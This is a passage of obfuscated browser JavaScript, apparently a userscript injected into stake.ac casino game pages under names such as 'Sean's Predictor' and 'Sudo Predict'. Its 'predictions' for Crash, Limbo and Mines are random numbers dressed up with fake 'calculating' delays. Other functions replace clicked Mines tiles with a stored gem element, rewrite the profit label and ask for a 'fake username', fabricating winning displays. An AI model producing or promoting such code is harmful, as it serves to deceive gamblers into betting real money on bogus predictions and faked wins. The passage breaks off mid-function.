  let _0x4f2b66;
  let _0x371757;
  let _0x4ba692;
  function _0x450b24() {
    _0x4a8c70 = true;
    (function () {
      let _0x1a50cf = document.createElement("div");
      _0x1a50cf.id = "customCrashGUI";
      _0x1a50cf.style.position = "fixed";
      _0x1a50cf.style.top = "50%";
      _0x1a50cf.style.right = "30px";
      _0x1a50cf.style.transform = "translateY(-50%)";
      _0x1a50cf.style.width = "350px";
      _0x1a50cf.style.padding = "20px";
      _0x1a50cf.style.background = "linear-gradient(135deg, rgba(26, 32, 44, 0.9), rgba(38, 50, 72, 0.9))";
      _0x1a50cf.style.borderRadius = "15px";
      _0x1a50cf.style.boxShadow = "0 20px 40px rgba(0, 0, 0, 0.6)";
      _0x1a50cf.style.zIndex = "10000";
      _0x1a50cf.style.fontFamily = "Segoe UI, sans-serif";
      _0x1a50cf.style.color = '#FFFFFF';
      let _0x427e56 = document.createElement('div');
      _0x427e56.innerText = "Sean's Predictor";
      _0x427e56.style.textAlign = "center";
      _0x427e56.style.marginBottom = "20px";
      _0x427e56.style.fontSize = "20px";
      _0x427e56.style.fontWeight = "bold";
      _0x427e56.style.color = "#ffffff";
      _0x427e56.style.padding = "10px 0";
      _0x427e56.style.borderBottom = "2px solid #FFFFFF";
      let _0x5234e1 = document.createElement("button");
      _0x5234e1.innerText = "Predict next multiplier";
      _0x5234e1.style.width = "100%";
      _0x5234e1.style.padding = "12px";
      _0x5234e1.style.border = 'none';
      _0x5234e1.style.borderRadius = "10px";
      _0x5234e1.style.background = "linear-gradient(135deg, #ff416c, #ff4b2b)";
      _0x5234e1.style.color = '#FFFFFF';
      _0x5234e1.style.fontSize = "16px";
      _0x5234e1.style.fontWeight = "bold";
      _0x5234e1.style.cursor = "pointer";
      _0x5234e1.style.transition = "transform 0.3s, box-shadow 0.3s";
      _0x5234e1.addEventListener('mouseover', function () {
        _0x5234e1.style.transform = "translateY(-4px)";
        _0x5234e1.style.boxShadow = "0 15px 30px rgba(255, 65, 108, 0.7)";
      });
      _0x5234e1.addEventListener('mouseout', function () {
        _0x5234e1.style.transform = "translateY(0)";
        _0x5234e1.style.boxShadow = 'none';
      });
      _0x5234e1.addEventListener("click", function () {
        let _0xe32cc6 = (0.75 * Math.random() + 1.2).toFixed(0x2);
        let _0x3e2b86 = (0.75 * Math.random() + 1.2).toFixed(0x2);
        _0x2e3aad("Crash Predicted: " + Math.min(_0xe32cc6, _0x3e2b86) + "x - " + Math.max(_0xe32cc6, _0x3e2b86) + 'x');
      });
      _0x1a50cf.appendChild(_0x427e56);
      _0x1a50cf.appendChild(_0x5234e1);
      document.body.appendChild(_0x1a50cf);
    })();
    if (!_0x2b90c1) {
      _0x2b90c1 = true;
      _0x4f2b66 = setInterval(() => {
        if (!window.location.href.startsWith("https://stake.ac/casino/games/crash")) {
          clearInterval(_0x4f2b66);
          _0x111052();
          _0x12df4a();
          _0x4d15d6();
          document.querySelector("#customCrashGUI").remove();
        }
      }, 0x64);
    }
  }
  function _0x5e26f4() {
    const _0x2b1a65 = document.querySelector("[data-testid=\"bet-button\"][data-analytics=\"bet-button\"]") || document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\]");
    if (_0x2b1a65) {
      _0x2b1a65.disabled = false;
    }
    const _0x1c8d7b = document.querySelector("[data-testid=\"bet-button\"][data-analytics=\"bet-button\"] > div") || document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\] > div");
    if (_0x1c8d7b) {
      _0x1c8d7b.classList.remove("invisible");
    }
    const _0x55d3d1 = _0x2b1a65.querySelector("div.inline-flex.justify-center.items-center.absolute.top-1\\/2.left-1\\/2.-translate-x-1\\/2.-translate-y-1\\/2");
    if (_0x55d3d1) {
      _0x55d3d1.remove();
    }
  }
  function _0x3b13a6() {
    const _0xa46579 = localStorage.getItem("copiedMineElement");
    const _0xe0ab8c = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div");
    const _0x17c7d9 = new DOMParser().parseFromString(_0xa46579, "text/html").body.firstChild;
    const _0x302462 = [];
    Array.from(_0xe0ab8c.children).forEach((_0x2873fc, _0x33908f) => {
      let _0x487429;
      if (_0x19ae3b) {
        _0x487429 = _0xe0ab8c.children[_0x33908f];
      } else {
        _0x487429 = function (_0x29c329) {
          const _0x186d32 = _0x29c329.cloneNode(true);
          if (_0x29c329.onclick) {
            _0x186d32.onclick = _0x29c329.onclick;
          }
          if (_0x29c329.onmouseover) {
            _0x186d32.onmouseover = _0x29c329.onmouseover;
          }
          if (_0x29c329.onmouseout) {
            _0x186d32.onmouseout = _0x29c329.onmouseout;
          }
          return _0x186d32;
        }(_0x2873fc);
        _0xe0ab8c.replaceChild(_0x487429, _0x2873fc);
      }
      const _0x23dad1 = () => {
        _0x9d0f20();
        document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-grey-400.text-white.betterhover\\:hover\\:bg-grey-300.betterhover\\:hover\\:text-white.focus-visible\\:outline-white.text-sm.leading-none.shadow-md.py-\\[0\\.8125rem\\].px-\\[1rem\\]").disabled = true;
        _0x487429.removeEventListener("click", _0x23dad1);
        const _0x5d58c5 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.grid-row.svelte-aahjaw > label:nth-child(1) > div > div > input").value;
        const _0x41d79b = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.grid-row.svelte-aahjaw > label:nth-child(2) > div > div > input");
        const _0x364411 = _0x487429.querySelector('div');
        if (_0x364411) {
          _0x364411.className = "tile fetching svelte-187anwg";
        }
        const _0x390ca1 = _0x487429.firstElementChild;
        if (_0x390ca1) {
          _0x390ca1.className = "cover fetching svelte-187anwg";
        }
        const _0x16ad9e = Math.floor(0x227 * Math.random()) + 0xfa;
        _0x443e96++;
        setTimeout(() => {
          const _0x42c980 = _0x17c7d9.cloneNode(true);
          _0x487429.replaceWith(_0x42c980);
          _0x41d79b.value -= 0x1;
          const _0x3d7142 = _0x5085c8(Number(_0x5d58c5) - 0x1, 0x19 - (Number(_0x5d58c5) + Number(_0x41d79b.value)));
          document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.labels.svelte-5v1hdl > span > span").innerText = "Total profit (" + _0x3d7142 + '×)';
          _0x42c980.addEventListener("click", _0x23dad1);
          if ('0' === _0x41d79b.value) {
            _0x2de19d(_0x3d7142.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','), Number(_0x5d58c5));
            _0x302462.forEach(({
              button: _0x273a92,
              listener: _0xbbf6ff
            }, _0x4c43bc) => {
              _0x273a92.removeEventListener("click", _0xbbf6ff);
            });
          }
          _0x443e96--;
          if (0x0 === _0x443e96) {
            document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-grey-400.text-white.betterhover\\:hover\\:bg-grey-300.betterhover\\:hover\\:text-white.focus-visible\\:outline-white.text-sm.leading-none.shadow-md.py-\\[0\\.8125rem\\].px-\\[1rem\\]").disabled = false;
            _0x5e26f4();
          }
        }, _0x16ad9e);
      };
      _0x487429.addEventListener("click", _0x23dad1);
      _0x302462.push({
        'button': _0x487429,
        'listener': _0x23dad1
      });
    });
    _0x19ae3b = true;
  }
  function _0x1d2b31() {
    let _0x51d668 = document.createElement("div");
    _0x51d668.className = "customlimboModal";
    _0x51d668.id = "customlimboModal";
    _0x51d668.innerHTML = "\n        <div class=\"custom-modal-header\">Sudo Predict</div>\n        <div class=\"custom-modal-body\">\n            <button id=\"predictButton\">Predict next multiplier</button>\n        </div>\n        <div class=\"custom-modal-footer\">\n            <span>Credit : <b>@SudoDis</b></span>\n        </div>\n    ";
    document.body.appendChild(_0x51d668);
    const _0xc37386 = document.createElement("style");
    _0xc37386.innerHTML = "\n        #customlimboModal {\n            position: fixed;\n            bottom: 30px;\n            right: 30px;\n            width: 350px;\n            background: linear-gradient(135deg, rgba(26, 32, 44, 0.9), rgba(38, 50, 72, 0.9));\n            border-radius: 20px;\n            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);\n            font-family: 'Segoe UI', sans-serif;\n            color: #e0e0e0;\n            z-index: 10000;\n            animation: slideIn 0.5s ease forwards;\n        }\n\n        .custom-modal-header {\n            padding: 15px;\n            background: linear-gradient(135deg, #6dd5ed, #2193b0);\n            font-size: 20px;\n            font-weight: bold;\n            text-align: center;\n            color: #fff;\n        }\n\n        .custom-modal-body {\n            padding: 20px;\n            text-align: center;\n        }\n\n        #predictButton {\n            padding: 12px 28px;\n            border: none;\n            border-radius: 10px;\n            background: linear-gradient(135deg, #ff416c, #ff4b2b);\n            color: #fff;\n            font-size: 16px;\n            font-weight: bold;\n            cursor: pointer;\n            width: 100%;\n            transition: transform 0.3s, box-shadow 0.3s;\n        }\n\n        #predictButton:hover {\n            transform: translateY(-4px);\n            box-shadow: 0 15px 30px rgba(255, 65, 108, 0.7);\n        }\n\n        .custom-modal-footer {\n            padding: 12px;\n            background: rgba(255, 255, 255, 0.05);\n            text-align: center;\n            font-size: 13px;\n            color: #ccc;\n        }\n\n        @keyframes slideIn {\n            from {\n                transform: translateY(50px);\n                opacity: 0;\n            }\n            to {\n                transform: translateY(0);\n                opacity: 1;\n            }\n        }\n    ";
    document.head.appendChild(_0xc37386);
    document.getElementById("predictButton").addEventListener('click', function () {
      let _0x133054 = function (_0x4cfad7, _0x394b64, _0x1ab193) {
        let _0x34c816 = Math.random();
        let _0x566c95 = _0x4cfad7 + Math.log(0x1 - _0x34c816) / -_0x1ab193 * (_0x394b64 - _0x4cfad7);
        return Math.min(Math.max(_0x566c95, _0x4cfad7), _0x394b64).toFixed(0x2);
      }(1.05, 132.39, 0x23);
      _0x246db2 = _0x133054;
      _0x2e3aad("Limbo Predicted: " + _0x133054 + 'x');
    });
  }
  function _0x2e3aad(_0x3c9804) {
    const _0x1c69a7 = document.querySelector("#customPopup");
    if (_0x1c69a7) {
      _0x1c69a7.remove();
    }
    let _0x502528 = document.createElement("div");
    _0x502528.id = "customPopup";
    _0x502528.innerHTML = "\n        <div class=\"popup-header\">Prediction Result</div>\n        <div class=\"popup-body\">" + _0x3c9804 + "</div>\n        <button class=\"popup-close-btn\">OK</button>\n    ";
    document.body.appendChild(_0x502528);
    document.querySelector(".popup-close-btn").addEventListener("click", () => {
      _0x502528.remove();
    });
    _0x502528.style.opacity = '1';
    const _0x340502 = document.createElement("style");
    _0x340502.innerHTML = "\n        #customPopup {\n            position: fixed;\n            top: 50%;\n            left: 50%;\n            transform: translate(-50%, -50%);\n            width: 300px;\n            padding: 20px;\n            background: linear-gradient(135deg, rgba(45, 52, 71, 0.95), rgba(70, 89, 115, 0.95));\n            border-radius: 15px;\n            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);\n            font-family: 'Segoe UI', sans-serif;\n            color: #e0e0e0;\n            text-align: center;\n            z-index: 10001;\n            opacity: 0;\n            transition: opacity 0.3s ease-in-out;\n        }\n\n        .popup-header {\n            font-size: 22px;\n            font-weight: bold;\n            margin-bottom: 10px;\n            color: #ffffff;\n        }\n\n        .popup-body {\n            font-size: 18px;\n            margin-bottom: 20px;\n        }\n\n        .popup-close-btn {\n            padding: 10px 20px;\n            border: none;\n            border-radius: 10px;\n            background: linear-gradient(135deg, #ff416c, #ff4b2b);\n            color: #fff;\n            font-size: 16px;\n            font-weight: bold;\n            cursor: pointer;\n            transition: transform 0.3s, box-shadow 0.3s;\n        }\n\n        .popup-close-btn:hover {\n            transform: translateY(-2px);\n            box-shadow: 0 10px 20px rgba(255, 65, 108, 0.7);\n        }\n    ";
    document.head.appendChild(_0x340502);
  }
  function _0x40148e(_0xe4fb3b, _0x19884f) {
    if (document.querySelector(".popup-overlay")) {
      return;
    }
    const _0x1a5a30 = document.createElement("div");
    _0x1a5a30.className = "popup-overlay";
    _0x1a5a30.style.position = "fixed";
    _0x1a5a30.style.top = '0';
    _0x1a5a30.style.left = '0';
    _0x1a5a30.style.width = '100%';
    _0x1a5a30.style.height = "100%";
    _0x1a5a30.style.backgroundColor = "rgba(0, 0, 0, 0.7)";
    _0x1a5a30.style.zIndex = "9999";
    const _0x1c02ba = document.createElement("div");
    _0x1c02ba.style.position = 'absolute';
    _0x1c02ba.style.top = "50%";
    _0x1c02ba.style.left = "50%";
    _0x1c02ba.style.transform = "translate(-50%, -50%)";
    _0x1c02ba.style.padding = "20px";
    _0x1c02ba.style.backgroundColor = "#fff";
    _0x1c02ba.style.borderRadius = "8px";
    _0x1c02ba.style.boxShadow = "0 4px 15px rgba(0, 0, 0, 0.3)";
    _0x1c02ba.style.width = "90%";
    _0x1c02ba.style.maxWidth = '400px';
    _0x1c02ba.style.textAlign = "center";
    const _0x3f56cd = document.createElement('p');
    _0x3f56cd.textContent = _0xe4fb3b;
    _0x3f56cd.style.fontSize = "16px";
    _0x3f56cd.style.marginBottom = "15px";
    const _0x453050 = document.createElement('input');
    _0x453050.type = 'text';
    _0x453050.placeholder = "Enter fake username";
    _0x453050.style.width = "100%";
    _0x453050.style.padding = "10px";
    _0x453050.style.border = "1px solid #ccc";
    _0x453050.style.borderRadius = "4px";
    _0x453050.style.fontSize = "14px";
    _0x453050.style.boxShadow = "0 2px 5px rgba(0, 0, 0, 0.1)";
    const _0x123cf6 = document.createElement('button');
    _0x123cf6.textContent = 'Confirm';
    _0x123cf6.style.marginTop = "10px";
    _0x123cf6.style.padding = "10px 15px";
    _0x123cf6.style.backgroundColor = "#28a745";
    _0x123cf6.style.color = "#fff";
    _0x123cf6.style.border = "none";
    _0x123cf6.style.borderRadius = "4px";
    _0x123cf6.style.cursor = "pointer";
    _0x123cf6.style.fontSize = "16px";
    _0x123cf6.style.transition = "background-color 0.3s ease";
    _0x123cf6.addEventListener("mouseover", () => {
      _0x123cf6.style.backgroundColor = "#218838";
    });
    _0x123cf6.addEventListener("mouseout", () => {
      _0x123cf6.style.backgroundColor = "#28a745";
    });
    _0x1c02ba.appendChild(_0x3f56cd);
    _0x1c02ba.appendChild(_0x453050);
    _0x1c02ba.appendChild(_0x123cf6);
    _0x1a5a30.appendChild(_0x1c02ba);
    document.body.appendChild(_0x1a5a30);
    _0x123cf6.addEventListener("click", () => {
      const _0xb931f6 = _0x453050.value.trim();
      if (_0xb931f6) {
        localStorage.setItem("fakeUsername", _0xb931f6);
        document.body.removeChild(_0x1a5a30);
        if (_0x19884f) {
          _0x19884f(_0xb931f6);
        }
      } else {
        alert("Please enter a username.");
      }
    });
    _0x1a5a30.addEventListener("click", _0x25d115 => {
      if (_0x25d115.target === _0x1a5a30) {
        document.body.removeChild(_0x1a5a30);
      }
    });
    _0x1c02ba.addEventListener("click", _0x19a109 => {
      _0x19a109.stopPropagation();
    });
  }
  function _0x5ddbce() {
    _0x18b21d = document.createElement("div");
    _0x18b21d.className = "customPredictorModal";
    _0x18b21d.id = 'customPredictorModal';
    _0x18b21d.innerHTML = "\n            <div class=\"custom-modal-header\">Sean's Predictor</div>\n            <div class=\"custom-modal-body\">\n                <button id=\"startPredictionButton\">Start Prediction</button>\n            </div>\n            <div class=\"custom-modal-footer\">\n                <span>Credits: <b>@seanpredict</b></span>\n            </div>\n        ";
    document.body.appendChild(_0x18b21d);
    const _0x5c697b = document.createElement("style");
    _0x5c697b.innerHTML = "\n        /* Modal Container */\n        #customPredictorModal {\n            position: fixed;\n            bottom: 30px;\n            right: 30px;\n            width: 350px;\n            background: linear-gradient(135deg, rgba(26, 32, 44, 0.9), rgba(38, 50, 72, 0.9));\n            border-radius: 20px;\n            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);\n            overflow: hidden;\n            font-family: 'Segoe UI', sans-serif;\n            color: #e0e0e0;\n            z-index: 10000;\n            transform: translateY(50px);\n            opacity: 0;\n            animation: slideIn 0.5s ease forwards;\n        }\n\n        /* Header */\n        .custom-modal-header {\n            padding: 15px;\n            background: linear-gradient(135deg, #6dd5ed, #2193b0);\n            font-size: 20px;\n            font-weight: bold;\n            text-align: center;\n            border-bottom: 1px solid rgba(255, 255, 255, 0.2);\n            color: #fff;\n            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);\n        }\n\n        /* Body */\n        .custom-modal-body {\n            padding: 20px;\n            text-align: center;\n        }\n\n        /* Start Prediction Button */\n        #startPredictionButton {\n            padding: 12px 28px;\n            border: none;\n            border-radius: 10px;\n            background: linear-gradient(135deg, #ff416c, #ff4b2b);\n            color: #fff;\n            font-size: 16px;\n            font-weight: bold;\n            cursor: pointer;\n            box-shadow: 0 10px 20px rgba(255, 65, 108, 0.5);\n            position: relative;\n            overflow: hidden;\n            width: 100%;\n            transition: all 0.3s ease;\n        }\n\n        #startPredictionButton:hover {\n            transform: translateY(-4px);\n            box-shadow: 0 15px 30px rgba(255, 65, 108, 0.7);\n        }\n\n        /* Shine Effect */\n        #startPredictionButton::before {\n            content: '';\n            position: absolute;\n            top: 0;\n            left: -100%;\n            width: 100%;\n            height: 100%;\n            background: linear-gradient(90deg, rgba(255, 255, 255, 0.4) 0%, rgba(255, 255, 255, 0) 50%, rgba(255, 255, 255, 0.4) 100%);\n            animation: shine 1.5s ease-in-out infinite;\n        }\n\n        @keyframes shine {\n            0% {\n                left: -100%;\n            }\n            50% {\n                left: 100%;\n            }\n            100% {\n                left: 100%;\n            }\n        }\n\n        /* Toggle Container */\n        .custom-toggle-container {\n            display: flex;\n            justify-content: space-between;\n            align-items: center;\n            margin-top: 20px;\n            font-size: 14px;\n            color: #fff;\n        }\n\n        /* Toggle Switch */\n        .custom-switch {\n            position: relative;\n            display: inline-block;\n            width: 50px;\n            height: 26px;\n        }\n\n        .custom-switch input {\n            opacity: 0;\n            width: 0;\n            height: 0;\n        }\n\n        .custom-slider {\n            position: absolute;\n            cursor: pointer;\n            top: 0;\n            left: 0;\n            right: 0;\n            bottom: 0;\n            background-color: #666;\n            border-radius: 34px;\n            transition: 0.4s;\n            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);\n        }\n\n        .custom-slider:before {\n            position: absolute;\n            content: \"\";\n            height: 20px;\n            width: 20px;\n            left: 3px;\n            bottom: 3px;\n            background-color: white;\n            border-radius: 50%;\n            transition: 0.4s;\n            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.5);\n        }\n\n        input:checked + .custom-slider {\n            background-color: #34e89e;\n            box-shadow: 0 0 20px rgba(52, 232, 158, 0.7);\n        }\n\n        input:checked + .custom-slider:before {\n            transform: translateX(24px);\n        }\n\n        /* Footer */\n        .custom-modal-footer {\n            padding: 12px;\n            background: rgba(255, 255, 255, 0.05);\n            font-size: 13px;\n            text-align: center;\n            border-top: 1px solid rgba(255, 255, 255, 0.2);\n            color: #ccc;\n        }\n\n        .custom-modal-footer span {\n            color: #ccc;\n        }\n\n        /* Slide-in Animation */\n        @keyframes slideIn {\n            from {\n                transform: translateY(50px);\n                opacity: 0;\n            }\n            to {\n                transform: translateY(0);\n                opacity: 1;\n            }\n        }\n\n        /* Custom Popup */\n        #customPredictionPopup {\n            position: fixed;\n            top: 20%;\n            left: 50%;\n            transform: translateX(-50%);\n            width: 260px;\n            padding: 15px;\n            background: rgba(38, 50, 72, 0.95);\n            border-radius: 25px;\n            color: #fff;\n            text-align: center;\n            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);\n            display: none;\n            z-index: 10001;\n            animation: fadeIn 0.5s ease-out;\n        }\n\n        /* Header for Popup */\n        #customPredictionPopup .custom-modal-header {\n            font-size: 22px;\n            font-weight: 600;\n            color: #6dd5ed;\n            margin-bottom: 15px;\n            border-top-left-radius: 25px;\n            border-top-right-radius: 25px;\n            padding: 20px;\n            background: linear-gradient(135deg, #6dd5ed, #2193b0);\n            text-align: center;\n            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);\n        }\n\n        /* Body for Popup */\n        #customPredictionPopup .custom-modal-body {\n            font-size: 16px;\n            margin-bottom: 10px;\n        }\n\n        #customPredictionPopup button {\n            padding: 15px 30px;\n            border: none;\n            border-radius: 15px;\n            background: linear-gradient(135deg, #ff416c, #ff4b2b);\n            color: #fff;\n            font-size: 18px;\n            font-weight: bold;\n            cursor: pointer;\n            box-shadow: 0 10px 20px rgba(255, 65, 108, 0.5);\n            transition: transform 0.3s, box-shadow 0.3s;\n            margin-top: 20px;\n        }\n\n        #customPredictionPopup button:hover {\n            transform: translateY(-4px);\n            box-shadow: 0 15px 30px rgba(255, 65, 108, 0.7);\n        }\n\n        /* Popup Fade-In Animation */\n        @keyframes fadeIn {\n            from {\n                opacity: 0;\n                transform: translateY(-50px);\n            }\n            to {\n                opacity: 1;\n                transform: translateY(0);\n            }\n        }\n\n        /* Custom Loading Animation */\n        .custom-loading-arrows {\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            height: 50px;\n            margin-bottom: 20px;\n        }\n\n        .custom-loading-arrows span {\n            display: inline-block;\n            font-size: 24px;\n            animation: customArrows 1s infinite ease-in-out;\n            color: black;\n            margin: 0 5px;\n        }\n\n        .custom-loading-arrows span:nth-child(1) {\n            animation-delay: 0s;\n        }\n\n        .custom-loading-arrows span:nth-child(2) {\n            animation-delay: 0.1s;\n        }\n\n        .custom-loading-arrows span:nth-child(3) {\n            animation-delay: 0.3s;\n        }\n\n        .custom-loading-arrows span:nth-child(4) {\n            animation-delay: 0.4s;\n        }\n\n        .custom-loading-arrows span:nth-child(5) {\n            animation-delay: 0.5s;\n        }\n\n        @keyframes customArrows {\n            0%, 100% {\n                color: black;\n                transform: translateY(0);\n            }\n            50% {\n                color: #3AB493;\n                transform: translateY(20px);\n            }\n        }\n\n        /* Align close button and loading arrows properly */\n        #customPredictionPopup button, .custom-loading-arrows {\n            position: relative;\n            width: 100%;\n        }\n\n    ";
    document.head.appendChild(_0x5c697b);
    const _0x736ceb = document.createElement("div");
    _0x736ceb.id = "customPredictionPopup";
    _0x736ceb.innerHTML = "\n        <div class=\"custom-modal-header\">Prediction in Progress</div>\n        <div class=\"custom-modal-body\">\n            <p id=\"customPredictionText\">We are calculating the best prediction for your game...</p>\n            <div class=\"custom-loading-arrows\">\n                <span>↓</span><span>↓</span><span>↓</span><span>↓</span><span>↓</span>\n            </div>\n            <button id=\"closeCustomPopupButton\" style=\"display:none;\">Close</button>\n        </div>\n    ";
    document.body.appendChild(_0x736ceb);
    document.getElementById("startPredictionButton").addEventListener("click", () => {
      if (!document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.input-wrap.svelte-1nbx5re > div > input")) {
        return void function () {
          const _0x310730 = document.createElement("div");
          _0x310730.className = "custom-notification";
          const _0x419467 = document.createElement("span");
          _0x419467.className = 'notification-icon';
          _0x419467.innerHTML = '⚠️';
          const _0x4af4b9 = document.createElement("span");
          _0x4af4b9.className = "notification-message";
          _0x4af4b9.innerText = "No on-going bet detected!";
          _0x310730.appendChild(_0x419467);
          _0x310730.appendChild(_0x4af4b9);
          document.body.appendChild(_0x310730);
          const _0x31cd6e = document.createElement("style");
          _0x31cd6e.type = 'text/css';
          _0x31cd6e.innerText = "\n        /* Notification styles */\n        .custom-notification {\n            position: fixed;\n            top: 50%;\n            left: 50%;\n            transform: translate(-50%, -50%);\n            background-color: #FF9800; /* Warning orange color */\n            color: white;\n            padding: 25px 40px;\n            font-size: 20px;\n            font-weight: 700;\n            border-radius: 12px;\n            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);\n            text-align: center;\n            z-index: 9999;\n            min-width: 280px;\n            max-width: 500px;\n            line-height: 1.5;\n            transition: opacity 0.6s ease-in-out, transform 0.4s ease-out;\n            animation: slideInss 0.6s ease-out;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n        }\n\n        /* Icon styles */\n        .notification-icon {\n            font-size: 30px;\n            margin-right: 20px;\n            vertical-align: middle;\n        }\n\n        /* Message styles */\n        .notification-message {\n            font-size: 18px;\n            font-weight: 600;\n            vertical-align: middle;\n        }\n\n        /* Slide-in animation */\n        @keyframes slideInss {\n            0% { transform: translate(-50%, -60%) scale(0.8); opacity: 0; }\n            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }\n        }\n    ";
          document.head.appendChild(_0x31cd6e);
          setTimeout(() => {
            _0x310730.style.opacity = '0';
            _0x310730.style.transform = "translate(-50%, -50%) scale(0.8)";
            setTimeout(() => {
              _0x310730.remove();
            }, 0x258);
          }, 0xdac);
        }();
      }
      document.querySelector('.custom-loading-arrows').style.display = 'flex';
      document.getElementById("customPredictionText").textContent = "We are calculating the best prediction for your game...";
      document.getElementById("closeCustomPopupButton").style.display = 'none';
      _0x736ceb.style.display = "block";
      const _0x50065c = Math.floor(0xbb9 * Math.random()) + 0x7d0;
      setTimeout(() => {
        const _0xac2151 = parseInt(document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.grid-row.svelte-aahjaw > label:nth-child(1) > div > div > input").value, 0xa);
        const _0xd8f42c = Math.min(_0xac2151, 0x19);
        const _0x36a766 = new Set();
        if (_0xac2151 >= 0xd) {
          for (; _0x36a766.size <= _0xd8f42c;) {
            const _0x11eabe = Math.floor(0x19 * Math.random());
            _0x36a766.add(_0x11eabe);
          }
        } else {
          for (; _0x36a766.size < _0xd8f42c;) {
            const _0x456b48 = Math.floor(0x19 * Math.random());
            _0x36a766.add(_0x456b48);
          }
        }
        Array.from(_0x36a766).forEach(_0x570f47 => {
          !function (_0x43d2a0) {
            if (!_0x148448) {
              return void console.error("Image is not loaded yet.");
            }
            const _0x13d038 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > button:nth-child(" + _0x43d2a0 + ')');
            if (_0x13d038) {
              const _0x49ec26 = _0x148448.cloneNode();
              _0x49ec26.style.position = "absolute";
              _0x49ec26.style.top = "50%";
              _0x49ec26.style.left = '50%';
              _0x49ec26.style.transform = "translate(-50%, -50%)";
              _0x49ec26.style.width = "100px";
              _0x49ec26.style.height = '100px';
              _0x49ec26.style.opacity = 0.5;
              _0x49ec26.style.pointerEvents = 'none';
              _0x49ec26.style.boxShadow = "inset 0 0 10px rgba(0, 0, 0, 0.7)";
              _0x13d038.style.position = "relative";
              _0x13d038.style.overflow = "hidden";
              _0x13d038.appendChild(_0x49ec26);
            }
          }(_0x570f47);
        });
        document.querySelector(".custom-loading-arrows").style.display = "none";
        document.getElementById('customPredictionText').textContent = "Prediction is ready!";
        document.getElementById("closeCustomPopupButton").style.display = 'inline-block';
      }, _0x50065c);
    });
    document.getElementById('closeCustomPopupButton').addEventListener("click", () => {
      _0x736ceb.style.display = 'none';
    });
  }
  let _0x148448 = null;
  function _0x262f07(_0x3bdc58) {
    if (!(_0x3bdc58 instanceof Element)) {
      return '';
    }
    const _0x5b08c6 = [];
    for (; _0x3bdc58.nodeType === Node.ELEMENT_NODE;) {
      let _0xbbaf16 = _0x3bdc58.nodeName.toLowerCase();
      if (_0x3bdc58.id) {
        _0xbbaf16 += '#' + _0x3bdc58.id;
        _0x5b08c6.unshift(_0xbbaf16);
        break;
      }
      {
        let _0x51816a = _0x3bdc58;
        let _0x32c17 = 0x1;
        for (; _0x51816a = _0x51816a.previousElementSibling;) {
          _0x32c17++;
        }
        if (0x1 !== _0x32c17) {
          _0xbbaf16 += ':nth-of-type(' + _0x32c17 + ')';
        }
        _0x5b08c6.unshift(_0xbbaf16);
        _0x3bdc58 = _0x3bdc58.parentNode;
      }
    }
    return _0x5b08c6.join(" > ");
  }
  function _0x41c1d6(_0x5a7298, _0x1f07d9) {
